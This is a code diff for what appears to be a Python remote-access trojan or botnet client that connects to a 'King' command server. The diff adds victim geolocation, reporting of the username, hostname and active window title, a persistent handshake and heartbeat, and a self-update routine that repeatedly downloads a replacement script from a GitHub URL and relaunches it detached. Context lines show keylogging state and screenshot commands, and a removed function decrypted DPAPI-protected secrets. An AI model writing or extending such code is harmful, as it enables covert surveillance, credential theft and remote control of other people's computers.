@@ -100,6 +100,11 @@ DEFAULT_GITHUB_THRONE_URL = 'https://raw.githubusercontent.com/ShahDaraza/TestBo
 DRIVE_FIXED = 3
 DRIVE_REMOVABLE = 2
 
+LOCAL_VERSION_FILE = 'version.txt'
+UPDATE_CHECK_INTERVAL = 60  # seconds
+DEFAULT_GITHUB_VERSION_URL = 'https://raw.githubusercontent.com/ShahDaraza/TestBot/main/version.txt'
+DEFAULT_GITHUB_SCRIPT_URL = 'https://raw.githubusercontent.com/ShahDaraza/TestBot/main/python2.py'
+
 keylog_active = False
 keylog_data = ''
 keylog_thread = None
@@ -133,9 +138,13 @@ def silent_bootstrap():
                 pass
 
 
-def get_hwid():
-    """Return a hardware ID based on the MAC address."""
-    return '-'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0, 48, 8)][::-1]).upper()
+def get_current_version():
+    """Get the current version from version.txt."""
+    try:
+        with open(LOCAL_VERSION_FILE, 'r', encoding='utf-8') as f:
+            return f.read().strip()
+    except Exception:
+        return '0.0.0'
 
 
 def get_arp_table():
@@ -420,49 +429,218 @@ def get_username():
     try:
         return os.getlogin()
     except OSError:
-        return getpass.getuser()
+        try:
+            return getpass.getuser()
+        except:
+            return 'Unknown_User'
+
+
+def get_hwid():
+    """Return a hardware ID based on the MAC address."""
+    return '-'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0, 48, 8)][::-1]).upper()
+
+
+def get_location():
+    """Return location string from IP API in format City,Country or Unknown_Loc."""
+    try:
+        response = requests.get('http://ipapi.co/json/', timeout=5)
+        data = response.json()
+        city = data.get('city', '').strip()
+        country = data.get('country_name', '').strip()
+        
+        if not city and not country:
+            return 'Unknown_Loc'
+        elif city and country:
+            return f"{city},{country}"
+        elif city:
+            return city
+        else:
+            return country
+    except Exception:
+        return 'Unknown_Loc'
 
 
 def report_status():
-    """Report system status."""
+    """Report system status including window title with City and Country from ipapi.co."""
+    user_name = get_username()
+    location_str = get_location()
+    # Parse location string from get_location() which returns "City,Country" or "Unknown_Loc"
+    if ',' in location_str and location_str != 'Unknown_Loc':
+        city, country = location_str.split(',', 1)
+        city = city.strip()
+        country = country.strip()
+    else:
+        city = location_str if location_str not in ('Unknown_Loc', '') else 'Obscured'
+        country = 'Obscured'
+    isp = 'Obscured'  # Location API doesn't provide ISP directly
+
     report = {
         'HWID': get_hwid(),
         'OS': platform.system(),
         'Version': platform.version(),
         'Hostname': socket.gethostname(),
-        'User': get_username(),
+        'User': user_name,
+        'Username': user_name,
+        'SystemUsername': user_name,
+        'MachineName': socket.gethostname(),
+        'Location': location_str,
+        'City': city or 'Obscured',
+        'Country': country or 'Obscured',
+        'ISP': isp or 'Obscured',
+        'EvolveVersion': get_current_version(),
         'Python': platform.python_version(),
     }
+    
+    # Get current window title
+    try:
+        import ctypes
+        GetForegroundWindow = ctypes.windll.user32.GetForegroundWindow
+        GetWindowTextLength = ctypes.windll.user32.GetWindowTextLength
+        GetWindowTextW = ctypes.windll.user32.GetWindowTextW
+        
+        hwnd = GetForegroundWindow()
+        length = GetWindowTextLength(hwnd)
+        if length > 0:
+            buff = ctypes.create_unicode_buffer(length + 1)
+            GetWindowTextW(hwnd, buff, length + 1)
+            report['WindowTitle'] = buff.value
+        else:
+            report['WindowTitle'] = '[No Active Window]'
+    except Exception as e:
+        report['WindowTitle'] = '[Obscured]'
+    
     if PSUTIL_AVAILABLE:
         try:
             report['Uptime'] = f'{time.time() - psutil.boot_time():.2f}s'
             report['CPU'] = f'{psutil.cpu_percent(interval=0.2)}%'
-            report['Memory'] = f'{psutil.virtual_memory().percent}%'
+            mem = psutil.virtual_memory()
+            report['Memory'] = f'{mem.percent}%'
+            report['RAMAvailable'] = f'{mem.available / 1024 / 1024:.1f} MB available'
         except Exception:
             report['Uptime'] = 'N/A'
+            report['CPU'] = 'N/A'
+            report['Memory'] = 'N/A'
+            report['RAMAvailable'] = 'Obscured'
     else:
         report['Uptime'] = 'N/A'
+        report['CPU'] = 'N/A'
+        report['Memory'] = 'N/A'
+        report['RAMAvailable'] = 'Obscured'
+    
     return json.dumps(report)
 
 
-def decrypt_dpapi(encrypted_bytes):
-    """Decrypt DPAPI-protected bytes."""
-    class DATA_BLOB(ctypes.Structure):
-        _fields_ = [('cbData', ctypes.c_uint32), ('pbData', ctypes.POINTER(ctypes.c_char))]
+def check_for_updates(version_url=DEFAULT_GITHUB_VERSION_URL, script_url=DEFAULT_GITHUB_SCRIPT_URL):
+    """Check GitHub for a newer drone version and apply it if present."""
+    try:
+        remote_version = get_remote_version(version_url)
+        if not remote_version:
+            return False
 
-    data_in = DATA_BLOB(len(encrypted_bytes), ctypes.create_string_buffer(encrypted_bytes))
-    data_out = DATA_BLOB()
+        local_version = read_local_version()
+        if parse_semantic_version(remote_version) <= parse_semantic_version(local_version):
+            return False
 
-    ctypes.windll.crypt32.CryptUnprotectData.argtypes = [
-        ctypes.POINTER(DATA_BLOB), ctypes.c_void_p, ctypes.c_void_p,
-        ctypes.c_void_p, ctypes.c_void_p, ctypes.c_uint32, ctypes.POINTER(DATA_BLOB)
-    ]
+        script_bytes = download_remote_script(script_url)
+        if not script_bytes:
+            return False
 
-    if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(data_in), None, None, None, None, 0, ctypes.byref(data_out)):
-        decrypted = ctypes.string_at(data_out.pbData, data_out.cbData)
-        ctypes.windll.kernel32.LocalFree(data_out.pbData)
-        return decrypted
-    return None
+        print(f"[\033[92m+\033[0m] Remote version {remote_version} detected, updating from local {local_version}")
+        return perform_self_update(remote_version, script_bytes)
+    except Exception as e:
+        print(f"[\033[91m!\033[0m] Update check failed: {e}")
+        return False
+
+
+def get_remote_version(version_url):
+    """Fetch the latest version string from GitHub."""
+    try:
+        response = requests.get(version_url, timeout=15, headers={
+            'Cache-Control': 'no-cache',
+            'Pragma': 'no-cache',
+        })
+        response.raise_for_status()
+        return response.text.strip()
+    except Exception as e:
+        print(f"[-] Failed to fetch remote version: {e}")
+        return None
+
+
+def read_local_version():
+    """Read the local version string from disk."""
+    try:
+        with open(LOCAL_VERSION_FILE, 'r', encoding='utf-8') as f:
+            return f.read().strip()
+    except Exception:
+        return '0.0.0'
+
+
+def parse_semantic_version(version):
+    """Parse version into a comparable tuple."""
+    parts = re.findall(r'\d+', str(version))
+    return tuple(int(p) for p in parts) if parts else (0,)
+
+
+def download_remote_script(script_url):
+    """Download the latest drone script from GitHub."""
+    try:
+        response = requests.get(script_url, timeout=20)
+        response.raise_for_status()
+        return response.content
+    except Exception as e:
+        print(f"[-] Failed to download remote script: {e}")
+        return None
+
+
+def write_local_version(version):
+    """Persist the new version to disk."""
+    try:
+        with open(LOCAL_VERSION_FILE, 'w', encoding='utf-8') as f:
+            f.write(str(version))
+        return True
+    except Exception as e:
+        print(f"[-] Failed to write local version: {e}")
+        return False
+
+
+def perform_self_update(remote_version, script_bytes):
+    """Replace the current drone script and restart it."""
+    try:
+        current_path = os.path.abspath(__file__)
+        new_path = current_path + '.new'
+
+        with open(new_path, 'wb') as f:
+            f.write(script_bytes)
+            f.flush()
+            os.fsync(f.fileno())
+
+        backup_path = current_path + '.bak'
+        try:
+            if os.path.exists(backup_path):
+                os.remove(backup_path)
+            os.replace(current_path, backup_path)
+        except Exception:
+            pass
+
+        os.replace(new_path, current_path)
+        write_local_version(remote_version)
+
+        print(f"[\033[92m+\033[0m] Self-update complete to version {remote_version}. Restarting...")
+        subprocess.Popen([sys.executable, current_path] + sys.argv[1:], creationflags=subprocess.CREATE_NEW_PROCESS_GROUP | subprocess.DETACHED_PROCESS, close_fds=True)
+        os._exit(0)
+    except Exception as e:
+        print(f"[-] Self-update failed: {e}")
+        return False
+
+
+def auto_update_monitor():
+    """Monitor GitHub for updates in the background."""
+    while True:
+        try:
+            check_for_updates()
+        except Exception:
+            pass
+        time.sleep(UPDATE_CHECK_INTERVAL)
 
 
 def safe_copy(source, destination):
@@ -763,7 +941,49 @@ def _parse_king_destination(raw_value: str):
     return parsed.hostname, parsed.port
 
 
+def perform_persistent_handshake(sock, hwid, user, location, version):
+    """Keep sending the handshake every 2 seconds until KING_ACK is received."""
+    handshake_message = f"NODE_DATA|{hwid}|{user}|{location}|{version}|END_HANDSHAKE\n"
+    sock.setblocking(False)
+    last_send = 0
+
+    while True:
+        current_time = time.time()
+        if current_time - last_send >= 2:
+            try:
+                sock.sendall(handshake_message.encode('utf-8'))
+                print("[*] Shouting handshake (waiting for KING_ACK)...")
+                last_send = current_time
+            except BlockingIOError:
+                # Send will retry on the next loop iteration
+                pass
+            except Exception as e:
+                raise ConnectionError(f"Failed to send handshake: {e}")
+
+        try:
+            ack_bytes = sock.recv(1024)
+            if ack_bytes == b'':
+                raise ConnectionError("Connection closed before KING_ACK")
+
+            ack_data = ack_bytes.decode('utf-8', errors='ignore')
+            if "KING_ACK" in ack_data:
+                print("[+] KING_ACK received! Handshake complete.")
+                break
+        except BlockingIOError:
+            pass
+        except socket.timeout:
+            pass
+        except Exception as e:
+            raise ConnectionError(f"Handshake receive error: {e}")
+
+        time.sleep(0.1)
+
+    sock.setblocking(True)
+    sock.settimeout(15)
+
+
 def connect_to_king(king_url):
+    """Persistent Shouter: Keep sending handshake until KING_ACK is received."""
     while True:
         try:
             address = king_url.strip()
@@ -780,14 +1000,24 @@ def connect_to_king(king_url):
             print(f"[*] Connecting directly to Localtonet TCP: {host}:{port}")
 
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(15)
+            s.settimeout(10)
             s.connect((host, int(port)))
-            s.send("NODE_CONNECTED".encode())
 
-            print("[+] Connection Established and Handshake Sent!")
+            user = get_username()
+            location = get_location()
+            version = get_current_version()
+            hwid = get_hwid()
+
+            perform_persistent_handshake(s, hwid, user, location, version)
+
+            print("[+] Connection Established - Ready for commands!")
             return s
 
         except Exception as e:
+            try:
+                s.close()
+            except Exception:
+                pass
             print(f"[-] King not found ({e}). Retrying in 10 seconds...")
             time.sleep(10)
 
@@ -798,18 +1028,39 @@ def connect_direct_hub(hub_ip, port, max_retries: int = 3):
     for attempt in range(max_retries):
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(15)
+            s.settimeout(10)
             s.connect((hub_ip, port))
-            s.send("NODE_CONNECTED".encode())
-            print(f"[+] Direct TCP connection established to hub at {hub_ip}:{port}")
+
+            user = get_username()
+            location = get_location()
+            version = get_current_version()
+            hwid = get_hwid()
+
+            perform_persistent_handshake(s, hwid, user, location, version)
+
+            print(f"[+] Direct TCP connection established to hub at {hub_ip}:{port} with HWID")
             return s
         except Exception as e:
+            try:
+                s.close()
+            except Exception:
+                pass
             print(f"[-] [{attempt + 1}/{max_retries}] Connection attempt failed: {e}")
             if attempt < max_retries - 1:
                 time.sleep(1)
                 continue
             print(f"[-] Direct TCP connection failed after {max_retries} attempts")
             return None
+
+
+def send_heartbeat(sock):
+    """Send PING every 15 seconds to keep connection alive."""
+    while True:
+        time.sleep(15)
+        try:
+            sock.send(b'PING\n')
+        except Exception:
+            break
 
 
 def connect_to_hub(hub_ip, port, github_throne_url=DEFAULT_GITHUB_THRONE_URL):
@@ -837,6 +1088,10 @@ def connect_to_hub(hub_ip, port, github_throne_url=DEFAULT_GITHUB_THRONE_URL):
                 time.sleep(delay)
                 continue
             
+            print("[+] Connection Established - Ready for commands!")
+            # Start heartbeat thread
+            threading.Thread(target=send_heartbeat, args=(client,), daemon=True).start()
+
             while True:
                 try:
                     # Always use raw socket recv for TCP connection
@@ -865,6 +1120,9 @@ def connect_to_hub(hub_ip, port, github_throne_url=DEFAULT_GITHUB_THRONE_URL):
 
                     elif command == 'STATUS_REPORT':
                         client.send(f'STATUS:{report_status()}\n'.encode())
+                    elif command == 'TRIGGER_EVOLVE':
+                        check_for_updates()
+                        client.send(b'EVOLVE_CHECKED\nV_PULSE_EOF\n')
                     elif command == 'DESKTOP_CAPTURE':
                         capture_desktop_screenshot(client, is_websocket=False)
                     elif command == 'SCREENSHOT':
@@ -1113,4 +1371,8 @@ if __name__ == '__main__':
     else:
         print(f'[*] Connecting to King at {args.hub_ip}:{args.hub_port}')
 
+    # Start auto-update monitor
+    threading.Thread(target=auto_update_monitor, daemon=True).start()
+
     main_loop(args.hub_ip, args.hub_port, args.github_throne_url)
+
